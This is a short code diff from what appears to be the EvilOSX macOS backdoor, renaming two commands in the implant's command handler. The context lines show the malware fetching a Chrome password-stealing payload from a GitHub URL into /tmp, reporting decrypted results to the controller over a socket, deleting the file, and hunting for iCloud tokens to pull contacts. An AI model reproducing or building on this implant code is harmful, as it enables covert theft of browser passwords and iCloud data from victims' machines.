@@ -255,7 +255,7 @@ def start_server():
                     response += MESSAGE_INFO + "FileVault is off.\n"
 
                 server_socket.sendall(response)
-            elif command == "get_chrome_passwords":
+            elif command == "chrome_passwords":
                 payload_url = "https://raw.githubusercontent.com/Marten4n6/EvilOSX/master/Payloads/chrome_passwords.py"
                 payload_file = "/tmp/chrome_passwords.py"
 
@@ -292,7 +292,7 @@ def start_server():
                     server_socket.sendall(MESSAGE_INFO + "Decrypted successfully.")
 
                 execute_command("rm -rf {0}".format(payload_file))
-            elif command == "get_icloud_contacts":
+            elif command == "icloud_contacts":
                 if not os.path.isfile(get_program_folder(is_root()) + "/tokens.json"):
                     # The server should handle this message and then call "decrypt_mme".
                     server_socket.sendall(MESSAGE_ATTENTION + "Failed to find tokens.json")
